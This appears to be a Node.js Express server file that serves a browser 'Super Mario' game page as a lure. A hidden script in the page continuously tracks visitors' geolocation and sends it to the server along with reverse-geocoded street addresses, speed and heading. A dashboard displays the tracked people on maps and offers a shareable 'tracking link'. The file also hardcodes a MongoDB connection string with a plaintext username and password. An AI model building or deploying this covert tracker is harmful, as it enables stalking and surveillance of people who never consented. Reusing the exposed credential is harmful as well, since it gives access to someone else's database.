// index.js

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

// --- MongoDB Connection ---
const MONGO_URI =
  "mongodb+srv://Avverma:Avverma95766@avverma.2g4orpk.mongodb.net/location";
mongoose.connect(`${MONGO_URI}`, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch((err) => console.log(err));

// --- Location Schema ---
const locationSchema = new mongoose.Schema({
  userId: String,
  latitude: Number,
  longitude: Number,
  accuracy: Number,
  altitude: Number,
  altitudeAccuracy: Number,
  heading: Number,
  speed: Number,
  timestamp: Date,
  ipAddress: String,
  address: String,
  isLastLocation: { type: Boolean, default: false },
  sessionActive: { type: Boolean, default: true },
}, { timestamps: true });

const Location = mongoose.model('Location', locationSchema);

// --- User Session Schema ---
const sessionSchema = new mongoose.Schema({
  userId: { type: String, unique: true },
  sessionStart: Date,
  sessionEnd: Date,
  totalLocations: { type: Number, default: 0 },
  isActive: { type: Boolean, default: true },
}, { timestamps: true });

const Session = mongoose.model('Session', sessionSchema);

// --- Express App Setup ---
const app = express();
app.use(cors());
app.use(express.json());

// --- 1. Generate URL with Super Mario Game ---
app.get('/generate-url', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
      <title>Game Arena - Super Mario</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          -webkit-user-select: none;
          user-select: none;
          -webkit-touch-callout: none;
        }
        
        html, body {
          width: 100%;
          height: 100%;
          overflow: hidden;
        }
        
        body {
          font-family: Arial, sans-serif;
          background: linear-gradient(180deg, #87CEEB 0%, #E0F6FF 100%);
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 0;
          position: fixed;
        }
        
        .game-container {
          width: 100vw;
          height: 100vh;
          max-width: 600px;
          background: linear-gradient(180deg, #87CEEB 0%, #E0F6FF 50%, #90EE90 100%);
          display: flex;
          flex-direction: column;
          position: relative;
          overflow: hidden;
        }
        
        .game-header {
          background: rgba(0, 0, 0, 0.7);
          color: white;
          padding: 10px 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          font-weight: bold;
          z-index: 100;
        }
        
        .score-display {
          font-size: 16px;
        }
        
        .lives-display {
          font-size: 16px;
        }
        
        .game-canvas {
          flex: 1;
          position: relative;
          overflow: hidden;
        }
        
        .player {
          position: absolute;
          width: 30px;
          height: 40px;
          background: red;
          border: 2px solid darkred;
          bottom: 50px;
          left: 50px;
          z-index: 10;
        }
        
        .player::before {
          content: '';
          position: absolute;
          width: 8px;
          height: 8px;
          background: white;
          border-radius: 50%;
          top: 8px;
          left: 6px;
        }
        
        .player::after {
          content: '';
          position: absolute;
          width: 8px;
          height: 8px;
          background: white;
          border-radius: 50%;
          top: 8px;
          right: 6px;
        }
        
        .platform {
          position: absolute;
          background: #8B4513;
          border: 2px solid #654321;
        }
        
        .enemy {
          position: absolute;
          width: 30px;
          height: 25px;
          background: #00AA00;
          border: 2px solid #008000;
          z-index: 8;
        }
        
        .enemy::before {
          content: '';
          position: absolute;
          width: 6px;
          height: 6px;
          background: white;
          border-radius: 50%;
          top: 5px;
          left: 4px;
        }
        
        .enemy::after {
          content: '';
          position: absolute;
          width: 6px;
          height: 6px;
          background: white;
          border-radius: 50%;
          top: 5px;
          right: 4px;
        }
        
        .coin {
          position: absolute;
          width: 15px;
          height: 15px;
          background: gold;
          border-radius: 50%;
          z-index: 5;
          animation: coinFloat 0.6s infinite;
        }
        
        @keyframes coinFloat {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-5px); }
        }
        
        .jump-button {
          position: fixed;
          bottom: 20px;
          right: 20px;
          width: 60px;
          height: 60px;
          background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
          border: 3px solid #FF8C00;
          border-radius: 50%;
          font-size: 28px;
          cursor: pointer;
          z-index: 200;
          box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
          display: flex;
          justify-content: center;
          align-items: center;
          transition: transform 0.1s;
        }
        
        .jump-button:active {
          transform: scale(0.9);
        }
        
        .mobile-controls {
          position: fixed;
          bottom: 20px;
          left: 20px;
          display: flex;
          gap: 10px;
          z-index: 200;
        }
        
        .control-btn {
          width: 50px;
          height: 50px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border: 2px solid white;
          border-radius: 8px;
          color: white;
          font-size: 20px;
          cursor: pointer;
          transition: transform 0.1s;
          box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        
        .control-btn:active {
          transform: scale(0.95);
        }
        
        .game-over {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0, 0, 0, 0.9);
          color: white;
          padding: 40px;
          border-radius: 20px;
          text-align: center;
          z-index: 300;
          display: none;
          min-width: 280px;
        }
        
        .game-over h2 {
          font-size: 36px;
          margin-bottom: 20px;
        }
        
        .game-over p {
          font-size: 18px;
          margin-bottom: 10px;
        }
        
        .game-over button {
          background: #FFD700;
          color: black;
          border: none;
          padding: 12px 30px;
          font-size: 16px;
          border-radius: 10px;
          cursor: pointer;
          font-weight: bold;
          margin-top: 20px;
        }
        
        .level-indicator {
          position: fixed;
          top: 20px;
          left: 20px;
          background: rgba(255, 255, 255, 0.9);
          padding: 10px 15px;
          border-radius: 10px;
          font-weight: bold;
          z-index: 150;
        }
      </style>
    </head>
    <body>
      <div class="game-container">
        <div class="game-header">
          <div class="score-display">Score: <span id="score">0</span></div>
          <div class="lives-display">Lives: <span id="lives">3</span></div>
        </div>
        <div class="game-canvas" id="gameCanvas"></div>
      </div>

      <div class="level-indicator">Level: <span id="level">1</span></div>
      
      <button class="jump-button" id="jumpBtn">⬆️</button>
      
      <div class="mobile-controls">
        <button class="control-btn" id="leftBtn">⬅️</button>
        <button class="control-btn" id="rightBtn">➡️</button>
      </div>

      <div class="game-over" id="gameOver">
        <h2 id="gameOverTitle">Game Over!</h2>
        <p>Final Score: <span id="finalScore">0</span></p>
        <p>Level Reached: <span id="finalLevel">1</span></p>
        <button onclick="location.reload()">Play Again</button>
      </div>

      <script>
        let gameState = {
          score: 0,
          lives: 3,
          level: 1,
          gameActive: true
        };

        const canvas = document.getElementById('gameCanvas');
        const gameOverDiv = document.getElementById('gameOver');
        
        let player = {
          x: 50,
          y: 250,
          width: 30,
          height: 40,
          velocityY: 0,
          velocityX: 0,
          isJumping: false,
          direction: 1
        };

        let platforms = [];
        let enemies = [];
        let coins = [];
        let gameObjects = [];

        const gravity = 0.5;
        const jumpPower = 12;

        function createPlatform(x, y, width, height) {
          const platform = document.createElement('div');
          platform.className = 'platform';
          platform.style.left = x + 'px';
          platform.style.top = y + 'px';
          platform.style.width = width + 'px';
          platform.style.height = height + 'px';
          canvas.appendChild(platform);
          
          platforms.push({
            x: x,
            y: y,
            width: width,
            height: height,
            element: platform
          });
        }

        function createEnemy(x, y) {
          const enemy = document.createElement('div');
          enemy.className = 'enemy';
          enemy.style.left = x + 'px';
          enemy.style.top = y + 'px';
          canvas.appendChild(enemy);
          
          enemies.push({
            x: x,
            y: y,
            width: 30,
            height: 25,
            velocityX: (Math.random() > 0.5 ? 1 : -1) * 2,
            element: enemy
          });
        }

        function createCoin(x, y) {
          const coin = document.createElement('div');
          coin.className = 'coin';
          coin.style.left = x + 'px';
          coin.style.top = y + 'px';
          canvas.appendChild(coin);
          
          coins.push({
            x: x,
            y: y,
            width: 15,
            height: 15,
            element: coin,
            collected: false
          });
        }

        function generateLevel() {
          platforms = [];
          enemies = [];
          coins = [];
          
          canvas.innerHTML = '';

          const canvasWidth = canvas.clientWidth;
          const canvasHeight = canvas.clientHeight;

          createPlatform(0, canvasHeight - 50, canvasWidth, 50);

          const platformCount = 6 + gameState.level;
          for (let i = 0; i < platformCount; i++) {
            const x = Math.random() * (canvasWidth - 80);
            const y = canvasHeight - 100 - (i * 80);
            const width = 70 + Math.random() * 40;
            createPlatform(x, y, width, 15);
          }

          const enemyCount = 2 + gameState.level;
          for (let i = 0; i < enemyCount; i++) {
            const x = Math.random() * (canvasWidth - 30);
            const y = Math.random() * (canvasHeight - 150);
            createEnemy(x, y);
          }

          for (let i = 0; i < 5 + gameState.level; i++) {
            const x = Math.random() * (canvasWidth - 15);
            const y = Math.random() * (canvasHeight - 100);
            createCoin(x, y);
          }

          const playerElement = document.createElement('div');
          playerElement.className = 'player';
          playerElement.id = 'player';
          playerElement.style.left = player.x + 'px';
          playerElement.style.bottom = player.y + 'px';
          canvas.appendChild(playerElement);

          player.element = playerElement;
        }

        function updatePlayer() {
          if (!gameState.gameActive) return;

          player.velocityY += gravity;
          player.y -= player.velocityY;
          player.x += player.velocityX;

          const canvasWidth = canvas.clientWidth;
          const canvasHeight = canvas.clientHeight;

          if (player.x < 0) player.x = 0;
          if (player.x + player.width > canvasWidth) player.x = canvasWidth - player.width;

          let onGround = false;

          for (let platform of platforms) {
            if (player.velocityY <= 0 &&
                player.y - player.velocityY > platform.y &&
                player.y < platform.y + platform.height + 5 &&
                player.x + player.width > platform.x &&
                player.x < platform.x + platform.width) {
              player.y = platform.y + player.height;
              player.velocityY = 0;
              player.isJumping = false;
              onGround = true;
            }
          }

          for (let i = 0; i < enemies.length; i++) {
            const enemy = enemies[i];
            if (checkCollision(player, enemy)) {
              gameState.lives--;
              document.getElementById('lives').textContent = gameState.lives;
              
              if (gameState.lives <= 0) {
                endGame();
              } else {
                player.x = 50;
                player.y = 250;
                player.velocityY = 0;
              }
            }
          }

          for (let i = 0; i < coins.length; i++) {
            const coin = coins[i];
            if (!coin.collected && checkCollision(player, coin)) {
              coin.collected = true;
              coin.element.remove();
              gameState.score += 10;
              document.getElementById('score').textContent = gameState.score;
            }
          }

          if (player.y > canvasHeight + 50) {
            gameState.lives--;
            document.getElementById('lives').textContent = gameState.lives;
            
            if (gameState.lives <= 0) {
              endGame();
            } else {
              player.x = 50;
              player.y = 250;
              player.velocityY = 0;
            }
          }

          if (player.y < -50) {
            gameState.level++;
            gameState.score += 100;
            document.getElementById('level').textContent = gameState.level;
            document.getElementById('score').textContent = gameState.score;
            generateLevel();
            player.x = 50;
            player.y = 250;
            player.velocityY = 0;
          }

          player.element.style.left = player.x + 'px';
          player.element.style.bottom = player.y + 'px';
        }

        function updateEnemies() {
          const canvasWidth = canvas.clientWidth;

          for (let enemy of enemies) {
            enemy.x += enemy.velocityX;

            if (enemy.x < 0 || enemy.x + enemy.width > canvasWidth) {
              enemy.velocityX *= -1;
            }

            enemy.element.style.left = enemy.x + 'px';
          }
        }

        function checkCollision(obj1, obj2) {
          return obj1.x < obj2.x + obj2.width &&
                 obj1.x + obj1.width > obj2.x &&
                 obj1.y < obj2.y + obj2.height &&
                 obj1.y + obj1.height > obj2.y;
        }

        function jump() {
          if (!gameState.gameActive) return;
          
          if (!player.isJumping) {
            player.velocityY = jumpPower;
            player.isJumping = true;
          }
        }

        function moveLeft() {
          if (gameState.gameActive) {
            player.velocityX = -5;
          }
        }

        function moveRight() {
          if (gameState.gameActive) {
            player.velocityX = 5;
          }
        }

        function stopMoving() {
          player.velocityX *= 0.8;
        }

        function endGame() {
          gameState.gameActive = false;
          document.getElementById('gameOverTitle').textContent = gameState.lives > 0 ? 'Level Complete!' : 'Game Over!';
          document.getElementById('finalScore').textContent = gameState.score;
          document.getElementById('finalLevel').textContent = gameState.level;
          gameOverDiv.style.display = 'block';
        }

        document.getElementById('jumpBtn').addEventListener('click', jump);
        document.getElementById('leftBtn').addEventListener('mousedown', moveLeft);
        document.getElementById('rightBtn').addEventListener('mousedown', moveRight);
        document.getElementById('leftBtn').addEventListener('mouseup', stopMoving);
        document.getElementById('rightBtn').addEventListener('mouseup', stopMoving);
        document.getElementById('leftBtn').addEventListener('touchstart', function(e) {
          e.preventDefault();
          moveLeft();
        });
        document.getElementById('rightBtn').addEventListener('touchstart', function(e) {
          e.preventDefault();
          moveRight();
        });
        document.getElementById('leftBtn').addEventListener('touchend', stopMoving);
        document.getElementById('rightBtn').addEventListener('touchend', stopMoving);

        document.addEventListener('keydown', function(e) {
          if (e.key === 'ArrowLeft') moveLeft();
          if (e.key === 'ArrowRight') moveRight();
          if (e.key === ' ' || e.key === 'ArrowUp') jump();
        });

        document.addEventListener('keyup', stopMoving);

        function gameLoop() {
          updatePlayer();
          updateEnemies();
          requestAnimationFrame(gameLoop);
        }

        generateLevel();
        gameLoop();

        // Location tracking code
        let userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let lastPosition = null;
        let sessionStarted = false;
        let lastLocationSendTime = 0;
        const LOCATION_SEND_INTERVAL = 5000;

        async function getAddressFromCoords(lat, lng) {
          try {
            const response = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&zoom=18&addressdetails=1');
            if (!response.ok) throw new Error('Geocoding failed');
            const data = await response.json();
            return data.display_name || 'Address not available';
          } catch (error) {
            return null;
          }
        }

        function isLocationChanged(newPosition) {
          if (!lastPosition) return true;
          const latDiff = Math.abs(newPosition.coords.latitude - lastPosition.coords.latitude);
          const lngDiff = Math.abs(newPosition.coords.longitude - lastPosition.coords.longitude);
          return latDiff > 0.00001 || lngDiff > 0.00001;
        }

        async function sendLocationToServer(position, isFinal = false) {
          try {
            const now = Date.now();
            
            if (!isFinal && now - lastLocationSendTime < LOCATION_SEND_INTERVAL) {
              return;
            }

            if (!isFinal && !isLocationChanged(position)) {
              return;
            }

            const address = await getAddressFromCoords(position.coords.latitude, position.coords.longitude);
            
            const locationData = {
              userId: userId,
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              altitudeAccuracy: position.coords.altitudeAccuracy,
              heading: position.coords.heading,
              speed: position.coords.speed,
              timestamp: new Date(position.timestamp),
              address: address,
              isLastLocation: isFinal,
              sessionActive: !isFinal
            };

            if (isFinal) {
              navigator.sendBeacon('/api/location/last', JSON.stringify(locationData));
              navigator.sendBeacon('/api/session/end', JSON.stringify({ userId: userId }));
            } else {
              await fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
              });
              lastLocationSendTime = now;
            }

            lastPosition = position;
          } catch (error) {
            console.error('Error sending location:', error);
          }
        }

        async function startSession() {
          if (!sessionStarted) {
            try {
              const response = await fetch('/api/session/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: userId })
              });
              
              if (response.ok) {
                sessionStarted = true;
              }
            } catch (err) {
              console.error('Error starting session:', err);
            }
          }
        }

        function startTracking() {
          if (!navigator.geolocation) {
            console.error('Geolocation not supported');
            return;
          }

          const geoOptions = {
            enableHighAccuracy: false,
            timeout: 30000,
            maximumAge: 5000
          };

          navigator.geolocation.watchPosition(
            function(position) {
              if (!sessionStarted) {
                startSession();
              }
              sendLocationToServer(position);
            },
            function(error) {
              console.error('Watch position error:', error);
            },
            geoOptions
          );
        }

        window.addEventListener('load', function() {
          setTimeout(startTracking, 1000);
        });

        window.addEventListener('beforeunload', function() {
          if (lastPosition && userId) {
            sendLocationToServer(lastPosition, true);
          }
        });
      </script>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// --- 2. Beautiful Dashboard with Delete and Copy Link Features ---
app.get('/api/view-locations', async (req, res) => {
  try {
    const locations = await Location.find().sort({ createdAt: -1 }).limit(100);
    const activeSessions = await Session.countDocuments({ isActive: true });
    const totalUsers = await Location.distinct('userId');
    
     const TRACKING_LINK = 'https://games-j1xf.onrender.com/generate-url';
    
    let locationsHTML = '';
    if (locations.length > 0) {
      locationsHTML = locations.map(loc => {
        const dateStr = new Date(loc.createdAt).toLocaleString();
        const statusBadge = loc.sessionActive ? '🟢 Active' : '🔴 Inactive';
        const statusClass = loc.sessionActive ? 'status-active' : 'status-inactive';
        const lat = loc.latitude ? loc.latitude.toFixed(6) : 'N/A';
        const lng = loc.longitude ? loc.longitude.toFixed(6) : 'N/A';
        const accuracy = loc.accuracy ? loc.accuracy.toFixed(2) + ' m' : 'N/A';
        const speed = loc.speed ? (loc.speed * 3.6).toFixed(2) + ' km/h' : 'N/A';
        const addressHTML = loc.address ? '<div class="address">📍 ' + loc.address + '</div>' : '';
        const mapsLink = 'https://www.google.com/maps?q=' + loc.latitude + ',' + loc.longitude;
        
        return `
          <div class="location-card">
            <div class="location-header">
              <span class="user-id">👤 ${loc.userId}</span>
              <span class="timestamp">🕐 ${dateStr}</span>
              <span class="status-badge ${statusClass}">${statusBadge}</span>
            </div>
            
            <div class="location-details">
              <div class="detail-item">
                <span class="detail-label">Latitude</span>
                <span class="detail-value">${lat}</span>
              </div>
              
              <div class="detail-item">
                <span class="detail-label">Longitude</span>
                <span class="detail-value">${lng}</span>
              </div>
              
              <div class="detail-item">
                <span class="detail-label">Accuracy</span>
                <span class="detail-value">${accuracy}</span>
              </div>
              
              <div class="detail-item">
                <span class="detail-label">Speed</span>
                <span class="detail-value">${speed}</span>
              </div>
            </div>
            
            ${addressHTML}
            
            <a href="${mapsLink}" target="_blank" class="map-link">
              🗺️ View on Google Maps
            </a>
          </div>
        `;
      }).join('');
    } else {
      locationsHTML = '<div class="empty-state"><p>📭 No location data available yet</p></div>';
    }

    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Location Dashboard</title>
        <style>
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
          }
          
          .dashboard {
            max-width: 1400px;
            margin: 0 auto;
          }
          
          .header {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
          }
          
          .header h1 {
            color: #2d3748;
            font-size: 32px;
            margin-bottom: 10px;
          }
          
          .header p {
            color: #718096;
            font-size: 16px;
          }
          
          .share-section {
            background: #edf2f7;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
          }
          
          .share-label {
            color: #2d3748;
            font-weight: 600;
            font-size: 14px;
          }
          
          .link-container {
            display: flex;
            align-items: center;
            background: white;
            border: 2px solid #667eea;
            border-radius: 8px;
            padding: 10px 15px;
            flex: 1;
            min-width: 250px;
            gap: 10px;
          }
          
          .link-text {
            color: #667eea;
            font-size: 13px;
            font-weight: 600;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
          }
          
          .copy-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s;
            white-space: nowrap;
          }
          
          .copy-btn:hover {
            background: #764ba2;
            transform: translateY(-2px);
          }
          
          .copy-btn.copied {
            background: #38a169;
          }
          
          .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
          }
          
          .stat-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            text-align: center;
          }
          
          .stat-icon {
            font-size: 40px;
            margin-bottom: 10px;
          }
          
          .stat-value {
            font-size: 36px;
            font-weight: 700;
            color: #667eea;
            margin-bottom: 5px;
          }
          
          .stat-label {
            color: #718096;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
          }
          
          .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
          }
          
          .btn {
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.3s;
          }
          
          .btn-refresh {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
          }
          
          .btn-refresh:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
          }
          
          .btn-delete {
            background: #fed7d7;
            color: #c53030;
          }
          
          .btn-delete:hover {
            background: #fc8181;
            color: white;
            transform: translateY(-2px);
          }
          
          .locations-container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
          }
          
          .locations-container h2 {
            color: #2d3748;
            margin-bottom: 20px;
            font-size: 24px;
          }
          
          .location-card {
            background: #f7fafc;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #667eea;
            transition: transform 0.2s, box-shadow 0.2s;
          }
          
          .location-card:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
          }
          
          .location-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
          }
          
          .user-id {
            font-weight: 600;
            color: #2d3748;
            font-size: 14px;
          }
          
          .timestamp {
            color: #718096;
            font-size: 12px;
          }
          
          .location-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 10px;
          }
          
          .detail-item {
            display: flex;
            flex-direction: column;
          }
          
          .detail-label {
            color: #718096;
            font-size: 11px;
            margin-bottom: 3px;
          }
          
          .detail-value {
            color: #2d3748;
            font-weight: 600;
            font-size: 13px;
          }
          
          .address {
            background: #edf2f7;
            padding: 12px;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 12px;
            color: #2d3748;
          }
          
          .map-link {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 20px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
            transition: transform 0.2s;
          }
          
          .map-link:hover {
            transform: translateY(-2px);
          }
          
          .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
          }
          
          .status-active {
            background: #c6f6d5;
            color: #22543d;
          }
          
          .status-inactive {
            background: #fed7d7;
            color: #742a2a;
          }

          .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #718096;
          }

          .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
          }

          .modal-content {
            background-color: white;
            margin: 10% auto;
            padding: 30px;
            border-radius: 10px;
            max-width: 400px;
            text-align: center;
          }

          .modal-content h2 {
            color: #2d3748;
            margin-bottom: 15px;
          }

          .modal-content p {
            color: #718096;
            margin-bottom: 20px;
          }

          .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
          }

          .modal-btn {
            padding: 10px 25px;
            border-radius: 5px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
          }

          .modal-btn-confirm {
            background: #c53030;
            color: white;
          }

          .modal-btn-confirm:hover {
            background: #9b2c2c;
          }

          .modal-btn-cancel {
            background: #e2e8f0;
            color: #2d3748;
          }

          .modal-btn-cancel:hover {
            background: #cbd5e0;
          }

          @media (max-width: 768px) {
            .header h1 {
              font-size: 24px;
            }
            
            .stat-value {
              font-size: 28px;
            }
            
            .location-details {
              grid-template-columns: 1fr;
            }

            .share-section {
              flex-direction: column;
              align-items: stretch;
            }

            .link-container {
              min-width: 100%;
            }
          }
        </style>
      </head>
      <body>
        <div class="dashboard">
          <div class="header">
            <h1>📍 Location Tracking Dashboard</h1>
            <p>Real-time location monitoring system</p>
            
            <div class="share-section">
              <span class="share-label">📤 Share Tracking Link:</span>
              <div class="link-container">
                <span class="link-text">${TRACKING_LINK}</span>
                <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
              </div>
            </div>
          </div>
          
          <div class="stats">
            <div class="stat-card">
              <div class="stat-icon">👥</div>
              <div class="stat-value">${totalUsers.length}</div>
              <div class="stat-label">Total Users</div>
            </div>
            
            <div class="stat-card">
              <div class="stat-icon">🟢</div>
              <div class="stat-value">${activeSessions}</div>
              <div class="stat-label">Active Sessions</div>
            </div>
            
            <div class="stat-card">
              <div class="stat-icon">📌</div>
              <div class="stat-value">${locations.length}</div>
              <div class="stat-label">Recent Locations</div>
            </div>
          </div>

          <div class="controls">
            <button class="btn btn-refresh" onclick="location.reload()">🔄 Refresh Data</button>
            <button class="btn btn-delete" onclick="openDeleteModal()">🗑️ Delete All Data</button>
          </div>
          
          <div class="locations-container">
            <h2>Recent Location Updates</h2>
            ${locationsHTML}
          </div>
        </div>

        <!-- Delete Modal -->
        <div id="deleteModal" class="modal">
          <div class="modal-content">
            <h2>⚠️ Delete All Data</h2>
            <p>This will permanently delete all locations, sessions, and user data. This action cannot be undone.</p>
            <div class="modal-buttons">
              <button class="modal-btn modal-btn-confirm" onclick="confirmDelete()">Delete All</button>
              <button class="modal-btn modal-btn-cancel" onclick="closeDeleteModal()">Cancel</button>
            </div>
          </div>
        </div>

        <script>
          function copyLink() {
            var text = '${TRACKING_LINK}';
            navigator.clipboard.writeText(text).then(function() {
              var btn = event.target;
              btn.textContent = '✅ Copied!';
              btn.classList.add('copied');
              setTimeout(function() {
                btn.textContent = '📋 Copy';
                btn.classList.remove('copied');
              }, 2000);
            });
          }

          function openDeleteModal() {
            document.getElementById('deleteModal').style.display = 'block';
          }

          function closeDeleteModal() {
            document.getElementById('deleteModal').style.display = 'none';
          }

          function confirmDelete() {
            if (confirm('Are you absolutely sure? This will delete ALL data permanently!')) {
              fetch('/api/delete-all', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
              })
              .then(function(resp) { return resp.json(); })
              .then(function(data) {
                alert(data.message);
                location.reload();
              })
              .catch(function(err) { 
                alert('Error: ' + err.message);
              });
            }
          }

          window.onclick = function(event) {
            var modal = document.getElementById('deleteModal');
            if (event.target == modal) {
              modal.style.display = 'none';
            }
          }
        </script>
      </body>
      </html>
    `;
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (error) {
    console.error('Error loading dashboard:', error);
    res.status(500).send('Error loading dashboard');
  }
});

// --- 3. Delete All Data API ---
app.post('/api/delete-all', async (req, res) => {
  try {
    const locationResult = await Location.deleteMany({});
    const sessionResult = await Session.deleteMany({});
    
    res.json({ 
      message: '✅ All data deleted successfully! ' + locationResult.deletedCount + ' locations and ' + sessionResult.deletedCount + ' sessions removed.',
      deleted: true,
      locationsDeleted: locationResult.deletedCount,
      sessionsDeleted: sessionResult.deletedCount
    });
  } catch (error) {
    console.error('Error deleting data:', error);
    res.status(500).json({ 
      message: '❌ Error deleting data',
      error: error.message 
    });
  }
});

// --- Save Location POST API ---
app.post('/api/location', async (req, res) => {
  try {
    const { userId, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp, address, isLastLocation, sessionActive } = req.body;
    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "";
    
    const location = new Location({ 
      userId,
      latitude, 
      longitude, 
      accuracy,
      altitude,
      altitudeAccuracy,
      heading,
      speed,
      timestamp,
      ipAddress,
      address,
      isLastLocation: isLastLocation || false,
      sessionActive: sessionActive !== undefined ? sessionActive : true
    });
    
    await location.save();

    if (userId) {
      await Session.findOneAndUpdate(
        { userId: userId },
        { $inc: { totalLocations: 1 } }
      );
    }

    res.send('Location saved successfully!');
  } catch (error) {
    console.error('Error saving location:', error);
    res.status(500).send('Error saving location');
  }
});

// --- Save Last Location API ---
app.post('/api/location/last', async (req, res) => {
  try {
    const { userId, latitude, longitude, accuracy, timestamp, address } = req.body;
    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "";
    
    const location = new Location({ 
      userId,
      latitude, 
      longitude, 
      accuracy,
      timestamp,
      ipAddress,
      address,
      isLastLocation: true,
      sessionActive: false
    });
    
    await location.save();
    res.send('Last location saved!');
  } catch (error) {
    console.error('Error saving last location:', error);
    res.status(500).send('Error saving last location');
  }
});

// --- Start Session API ---
app.post('/api/session/start', async (req, res) => {
  try {
    const { userId } = req.body;
    const session = new Session({
      userId,
      sessionStart: new Date(),
      isActive: true
    });
    await session.save();
    res.json({ message: 'Session started', sessionId: session._id });
  } catch (error) {
    if (error.code === 11000) {
      res.json({ message: 'Session already exists' });
    } else {
      console.error('Error starting session:', error);
      res.status(500).send('Error starting session');
    }
  }
});

// --- End Session API ---
app.post('/api/session/end', async (req, res) => {
  try {
    const { userId } = req.body;
    await Session.findOneAndUpdate(
      { userId: userId, isActive: true },
      { 
        sessionEnd: new Date(),
        isActive: false
      }
    );
    res.send('Session ended');
  } catch (error) {
    console.error('Error ending session:', error);
    res.status(500).send('Error ending session');
  }
});

// --- Get All Locations (JSON) ---
app.get('/api/locations', async (req, res) => {
  try {
    const locations = await Location.find().sort({ createdAt: -1 }).limit(1000);
    res.json(locations);
  } catch (error) {
    res.status(500).json({ error: 'Error fetching locations' });
  }
});

// --- Get Locations by User ID ---
app.get('/api/locations/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const locations = await Location.find({ userId }).sort({ createdAt: -1 });
    res.json(locations);
  } catch (error) {
    res.status(500).json({ error: 'Error fetching user locations' });
  }
});

// --- Start server ---
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Play Game & Track Location: http://localhost:${PORT}/generate-url`);
  console.log(`View Dashboard: http://localhost:${PORT}/api/view-locations`);
});
